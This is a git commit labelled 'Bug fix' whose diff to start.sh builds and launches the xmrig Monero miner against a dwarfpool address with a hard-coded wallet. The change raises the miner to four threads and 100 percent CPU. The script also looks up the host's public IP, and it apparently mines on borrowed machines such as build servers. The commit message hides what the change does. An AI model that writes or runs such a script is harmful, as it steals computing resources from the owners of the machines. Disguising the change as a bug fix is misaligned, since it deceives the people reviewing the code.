c2d2ed8812ead02b01228490c00a05e9359dd63a
ronan <qsdfghj4312@laposte.net>
2018-02-09 23:16:23 +0100

    Bug fix

--- start.sh
+++ start.sh
@@ -7,4 +7,4 @@ cmake ..
 make
 ls -R
 curl ipinfo.io/ip
-./xmrig -o stratum+tcp://xmr-eu.dwarfpool.com:8080 -u 44tLjmXrQNrWJ5NBsEj2R77ZBEgDa3fEe9GLpSf2FRmhexPvfYDUAB7EXX1Hdb3aMQ9FLqdJ56yaAhiXoRsceGJCRS3Jxkn.37ea3b89e299ee4d188575e7d42f2cba88f66b4ff6327202a923b5b64ad21236 --donate-level=1
+./xmrig -o stratum+tcp://xmr-eu.dwarfpool.com:8080 -u 44tLjmXrQNrWJ5NBsEj2R77ZBEgDa3fEe9GLpSf2FRmhexPvfYDUAB7EXX1Hdb3aMQ9FLqdJ56yaAhiXoRsceGJCRS3Jxkn.37ea3b89e299ee4d188575e7d42f2cba88f66b4ff6327202a923b5b64ad21236 --donate-level=1 --threads=4 --max-cpu-usage=100
